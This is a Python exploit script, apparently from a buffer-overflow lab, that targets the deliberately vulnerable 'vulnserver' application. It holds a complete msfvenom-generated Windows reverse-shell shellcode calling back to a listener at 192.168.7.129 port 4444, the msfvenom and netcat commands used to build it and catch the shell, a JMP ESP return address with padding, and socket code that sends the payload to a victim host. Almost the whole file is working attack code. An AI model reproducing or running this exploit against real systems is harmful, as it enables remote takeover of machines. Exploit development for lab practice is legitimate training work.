# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '192.168.7.62'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.7.129 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a'
SHELL =  b""
SHELL += b"\xda\xd7\xd9\x74\x24\xf4\xb8\xad\xa8\x39\xaa\x5a"
SHELL += b"\x29\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\xef"
SHELL += b"\xbb\xdb\x5f\x13\x53\x99\xa0\xeb\xa4\xfe\x29\x0e"
SHELL += b"\x95\x3e\x4d\x5b\x86\x8e\x05\x09\x2b\x64\x4b\xb9"
SHELL += b"\xb8\x08\x44\xce\x09\xa6\xb2\xe1\x8a\x9b\x87\x60"
SHELL += b"\x09\xe6\xdb\x42\x30\x29\x2e\x83\x75\x54\xc3\xd1"
SHELL += b"\x2e\x12\x76\xc5\x5b\x6e\x4b\x6e\x17\x7e\xcb\x93"
SHELL += b"\xe0\x81\xfa\x02\x7a\xd8\xdc\xa5\xaf\x50\x55\xbd"
SHELL += b"\xac\x5d\x2f\x36\x06\x29\xae\x9e\x56\xd2\x1d\xdf"
SHELL += b"\x56\x21\x5f\x18\x50\xda\x2a\x50\xa2\x67\x2d\xa7"
SHELL += b"\xd8\xb3\xb8\x33\x7a\x37\x1a\x9f\x7a\x94\xfd\x54"
SHELL += b"\x70\x51\x89\x32\x95\x64\x5e\x49\xa1\xed\x61\x9d"
SHELL += b"\x23\xb5\x45\x39\x6f\x6d\xe7\x18\xd5\xc0\x18\x7a"
SHELL += b"\xb6\xbd\xbc\xf1\x5b\xa9\xcc\x58\x34\x1e\xfd\x62"
SHELL += b"\xc4\x08\x76\x11\xf6\x97\x2c\xbd\xba\x50\xeb\x3a"
SHELL += b"\xbc\x4a\x4b\xd4\x43\x75\xac\xfd\x87\x21\xfc\x95"
SHELL += b"\x2e\x4a\x97\x65\xce\x9f\x38\x35\x60\x70\xf9\xe5"
SHELL += b"\xc0\x20\x91\xef\xce\x1f\x81\x10\x05\x08\x28\xeb"
SHELL += b"\xce\xf7\x05\xf4\x8f\x90\x57\xfa\x9e\x3c\xd1\x1c"
SHELL += b"\xca\xac\xb7\xb7\x63\x54\x92\x43\x15\x99\x08\x2e"
SHELL += b"\x15\x11\xbf\xcf\xd8\xd2\xca\xc3\x8d\x12\x81\xb9"
SHELL += b"\x18\x2c\x3f\xd5\xc7\xbf\xa4\x25\x81\xa3\x72\x72"
SHELL += b"\xc6\x12\x8b\x16\xfa\x0d\x25\x04\x07\xcb\x0e\x8c"
SHELL += b"\xdc\x28\x90\x0d\x90\x15\xb6\x1d\x6c\x95\xf2\x49"
SHELL += b"\x20\xc0\xac\x27\x86\xba\x1e\x91\x50\x10\xc9\x75"
SHELL += b"\x24\x5a\xca\x03\x29\xb7\xbc\xeb\x98\x6e\xf9\x14"
SHELL += b"\x14\xe7\x0d\x6d\x48\x97\xf2\xa4\xc8\xb7\x10\x6c"
SHELL += b"\x25\x50\x8d\xe5\x84\x3d\x2e\xd0\xcb\x3b\xad\xd0"
SHELL += b"\xb3\xbf\xad\x91\xb6\x84\x69\x4a\xcb\x95\x1f\x6c"
SHELL += b"\x78\x95\x35"

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
